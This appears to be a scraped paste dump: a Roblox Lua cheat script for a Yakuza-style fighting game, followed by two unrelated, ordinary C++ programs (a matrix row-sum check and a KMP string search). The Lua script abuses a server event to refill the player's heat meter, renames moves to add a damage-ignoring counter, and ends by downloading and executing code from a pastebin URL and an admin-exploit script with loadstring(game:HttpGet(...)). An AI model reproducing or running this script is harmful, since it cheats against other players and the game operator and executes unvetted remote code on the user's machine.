        local Anim = Char.Humanoid:LoadAnimation(Rep.Moves.H_SumoSlap.Anim)
        Anim.Priority = Enum.AnimationPriority.Action4
        Anim:AdjustSpeed(0.9)
        Anim:Play()
        play_ingamesound(""Teleport"")
        play_ingamesound(""Slap"")
        task.wait(0.55)
        play_ingamesound(""Slap"")
        task.wait(0.45)
        play_ingamesound(""Slap"")
        task.wait(0.8)
        play_ingamesound(""MassiveSlap"")
        Anim:Destroy()
    end
end)



local DragonText = ""Dragon""
local DragonColor = Color3.new(0.95, 0.05, 0.1)
local DragonSequence = ColorSequence.new({ColorSequenceKeypoint.new(0, DragonColor), ColorSequenceKeypoint.new(1, DragonColor)})
local moves = game.ReplicatedStorage.Moves
local styles = game.ReplicatedStorage.Styles
local plr = game.Players.LocalPlayer
local status = plr.Status

function isInBattle()
	return (plr:FindFirstChild(""InBattle"") and true or false)
end

function isDungeon()
	return game.ReplicatedStorage.Dungeon.Value
end

function doingHact()
	return (plr.Character:FindFirstChild(""Heated"") and true or false)
end

function showMaxHeatEffect()
	return (isInBattle() and not doingHact() and plr.Status.Heat.Value >= 100) and true or false
end

function hasWeaponInHand()
	return (plr.Character:FindFirstChild(""Holding"") and true or false)
end

local function change_color()
	if status.Style.Value == ""Brawler"" then
		local DragonSequence = ColorSequence.new{ColorSequenceKeypoint.new(0, styles.Brawler.Color.Value), ColorSequenceKeypoint.new(1, styles.Brawler.Color.Value)}
		local char = plr.Character
		char.HumanoidRootPart.Fire_Main.Color = DragonSequence
		char.HumanoidRootPart.Fire_Secondary.Color = DragonSequence
		char.HumanoidRootPart.Fire_Main.Rate = status.Heat.Value >= 100 and 115 or status.Heat.Value >= 75 and 85 or 80
		char.HumanoidRootPart.Fire_Secondary.Rate = status.Heat.Value >= 100 and 90 or status.Heat.Value >= 75 and 80 or 70
		char.HumanoidRootPart.Lines1.Color = DragonSequence
		char.HumanoidRootPart.Lines1.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Lines2.Color = DragonSequence
		char.HumanoidRootPart.Lines2.Rate = status.Heat.Value >= 100 and 60 or status.Heat.Value >= 75 and 40 or 20
		char.HumanoidRootPart.Sparks.Color = DragonSequence
		if not char.HumanoidRootPart.TimeFor.Enabled then
			char.HumanoidRootPart.TimeFor.Color = DragonSequence
		end

		char.UpperTorso[""r2f_aura_burst""].Lines1.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines2.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Flare.Color = DragonSequence
		char.UpperTorso[""r2f_aura_burst""].Lines1.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Flare.Enabled = showMaxHeatEffect()
		char.UpperTorso[""r2f_aura_burst""].Smoke.Color = DragonSequence
		char.UpperTorso.Evading.Color = DragonSequence
	end
end

local function FillHeat()
	local Event = game:GetService(""ReplicatedStorage"").Events.ME

	for i=1,6 do
		local A_1 =  {
			[1] = ""heat"", 
			[2] = game:GetService(""ReplicatedStorage"").Moves.Taunt
		}
		Event:FireServer(A_1)
	end
end

game:GetService(""RunService"").RenderStepped:Connect(change_color)

plr.Character.ChildAdded:Connect(function(v)
	if v.Name == 'Grabbing' then
		while v.Parent == plr.Character do
			if status.Heat.Value ~= 100 then
				FillHeat()
			end
			task.wait(0.05)
		end
	end
end)

if moves:FindFirstChild(""龍TigerDrop"") then
        moves:FindFirstChild(""BRCounter2"").Name = ""FakeCounter2""
        moves:FindFirstChild(""龍TigerDrop"").Name = ""BRCounter2""
        moves:FindFirstChild(""BRCounter1"").Name = ""FakeCounter1""
        moves:FindFirstChild(""BRGrab"").Name = ""FakeGrab""

        local ignore = Instance.new(""Folder"")
        ignore.Name = ""IgnoreDmg""
        ignore.Parent = moves:FindFirstChild(""BRCounter2"")

        if not moves:FindFirstChild(""BRCounter2""):FindFirstChild(""HSize"") then
            local n = Instance.new(""NumberValue"")
            n.Name = ""HSize""
            n.Value = 2
            n.Parent = moves:FindFirstChild(""BRCounter2"")
        end
    end

function playticksound()
	local sfx = Instance.new(""Sound"", workspace)
	sfx.SoundId = ""rbxassetid://12222183""
	sfx.Volume = 2

	game:GetService(""SoundService""):PlayLocalSound(sfx)

	spawn(function()
		wait(2)
		sfx:Destroy()
	end)
end

local notifyevent 
for i,v in pairs (pgui:GetChildren()) do
    if v:IsA(""BindableEvent"") then
        notifyevent = v
    end
end

local function sendNotification(text, color, sound)
    if not color then color = Color3.new(1, 1, 1) end
    pgui.NotifyUI.Awards.ChildAdded:Once(function(c)
        if c.Text == text then
            c.TextColor3 = color
            coroutine.wrap(function()
                local con;
                con = game:GetService(""RunService"").RenderStepped:Connect(function()
                    if not c then
                        con:Disconnect()
                        return
                    end
                    c.TextColor3 = color
                end)()
            end)()
        end
    end)
    notifyevent:Fire(text, sound or nil)
end

menu.Bars.Mobile_Title.Text = ""Jake Legend style!""

local uis = game:GetService(""UserInputService"")
local rushstyle = game.ReplicatedStorage.Styles.Rush
local brawlerstyle = game.ReplicatedStorage.Styles.Brawler
local beaststyle = game.ReplicatedStorage.Styles.Beast

local grabstrike = rushstyle:WaitForChild(""GrabStrike""):Clone()
local guruparry = brawlerstyle:WaitForChild(""GrabStrike"")

sendNotification(""Press X to swap counter step and parry on legend style"", color)

uis.InputBegan:Connect(function(key)
	if game.UserInputService:GetFocusedTextBox() == nil then
		if key.KeyCode == Enum.KeyCode.X then
			playticksound()
			if guruparry.Parent ~= nil then
				guruparry.Parent = nil
				grabstrike.Parent = brawlerstyle
				sendNotification(""Counter Quickstep Enabled"", color)
			else
			guruparry.Parent = brawlerstyle
				grabstrike.Parent = nil
				sendNotification(""Parry Enabled"", color)
			end
		end
	end
end)

local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

game.ReplicatedStorage.Moves.TigerDrop.Anim.AnimationId = ""rbxassetid://12120052426""
interf.Client.Disabled = true
task.wait(0.1)
interf.Client.Disabled = false


local plr = game.Players.LocalPlayer
local pgui = plr.PlayerGui
local interf = pgui.Interface

game.ReplicatedStorage.Moves.BRCounter2.Anim.AnimationId = ""rbxassetid://12120052426""
game.ReplicatedStorage.Moves.H_GUltimateEssence.Anim.AnimationId = ""rbxassetid://12338287890""
interf.Client.Disabled = true
task.wait(0.1)
interf.Client.Disabled = false

loadstring(game:HttpGet(""https://pastebin.com/raw/gsxvWvnj""))() 

loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIYinfiniteyield/master/source'))()"
rnbhiD2F,Untitled,Josif_tepe,C++,Tuesday 23rd of April 2024 08:00:51 AM CDT,"#include <stdio.h>

int main()
{
    int n, m;
    scanf(""%d%d"", &n, &m);

    int mat[n][m];
    for(int i = 0; i < n; i++) {
        for(int j = 0; j < m; j++) {
            scanf(""%d"", &mat[i][j]);
        }
    }

    for(int i = 0; i < n; i++) {
        int zbir = 0;
        for(int j = 1; j < m; j++) {
            zbir += mat[i][j];
        }
        if(mat[i][0] == zbir) {
            printf(""%d\n"", mat[i][0]);
        }
    }
    return 0;
}
"
2YPcGWkz,optimized_kmp,maxim_shlyahtin,C++,Tuesday 23rd of April 2024 07:58:51 AM CDT,"#include <iostream>
#include <vector>
#include <string>

void form_suffix_array(std::vector<int>& pi, std::string& a) {
	int j = 0, i = 1;
	while (i < a.length()) {
		if (a[i] != a[j]) {
			if (j == 0 && pi[i] == 0) {
				++i;
			}
			else {
				j = pi[j - 1];
			}
		}
		else {
			pi[i] = j + 1;
			++i;
			++j;
		}
	}
}

void print_str(std::string& str, int start, int end) {
	//std::cout << start << "" "" << end << '\n';
	if (start == end) return;
	start = start > str.length() ? start - str.length() : start;
	end = end > str.length() ? end - str.length() : end;
	for (int i = start; i < end; ++i) {
		std::cout << str[i];
	}
	std::cout << '\n';
}
//←→↑↓
auto print_space = [](int j) {for (int i = 0; i < j; ++i) std::cout << "" "";};

void display_current_pointer_position(std::string& a, std::string& t, int i, int j) {
	print_space(i);
	std::cout << ""|\n"";
	print_str(a, 0, a.length());
	print_space(i - j);
	print_str(t, 0, t.length());
	print_space(i);
	std::cout << ""|\n\n"";
}

std::vector<int> kmp(char a, std::string& t, std::vector<int>& pi) {
	std::vector<int> res;
	int m = t.length();
	int i = 0, j = 0;
	while (a != '.') {
		if (a == t[j]) {
			++i; ++j;
			if (j == m) {
				res.push_back(i - m);
			}
			std::cin >> a;
		}
		else {
			if (j > 0) {
				//display_current_pointer_position(a, t, i, j);
				j = pi[j - 1];
			}
			else {
				++i;
				std::cin >> a;
			}
		}
		//display_current_pointer_position(a, t, i, j);
	}
	if (res.size() == 0) {
		res.push_back(-1);
	}
	return res;
}

//лилилось лилилась

int main() {
	std::string p;
	std::cin >> p;
	//std::string t;
	//std::cin >> t;
	std::vector<int> pi(p.length(), 0);
	form_suffix_array(pi, p);
	char a;
	std::cin >> a;
	std::vector<int> res = kmp(a, p, pi);
	for (int i = 0; i < res.size(); ++i) {
		if (i < res.size() - 1)
			std::cout << res[i] << ',';
		else
			std::cout << res[i];
	}
	std::cout << '\n';
	return 0;
}"
